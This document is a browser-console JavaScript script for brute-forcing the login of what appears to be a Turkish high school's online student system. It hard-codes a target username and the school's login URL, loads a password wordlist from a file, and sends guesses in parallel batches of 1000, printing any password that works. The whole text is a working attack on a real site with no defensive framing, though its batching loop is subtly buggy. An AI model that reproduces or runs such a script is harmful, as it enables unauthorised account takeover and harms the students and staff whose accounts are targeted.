AKBIM_USERNAME = '123456789'
AKBIM_URL = 'https://sehitlerfenlisesiobs.com/require/class/login.php'

!(() => {
        var i = document.createElement('input'), r = new FileReader(),
	tryPass = async p => {
		var data = new FormData()

		data.append('request', 'login'), data.append('loginAs', 'standard')
		data.append('isRegister', '0'), data.append('newUser', '0')
		data.append('password', p), data.append('username', AKBIM_USERNAME)	

		var r = await fetch(AKBIM_URL, { method: 'POST', body: data, headers: { 'x-requested-with': 'XMLHttpRequest'  } }).then(r => r.json())
		if (r.success) { console.log(p); return p }
		return null
	}, startTryPass = async passwords => {
		for (let x = 0; x < passwords.length / 1000; x++) if ((await Promise.all(passwords.slice(x, x + 1000).map(tryPass))).some(r => r)) break
	}
	
        i.type = 'file', i.click()
        i.oninput = () => r.readAsText(i.files[0])
        r.onload = () => startTryPass(r.result.split('\n'))
})()
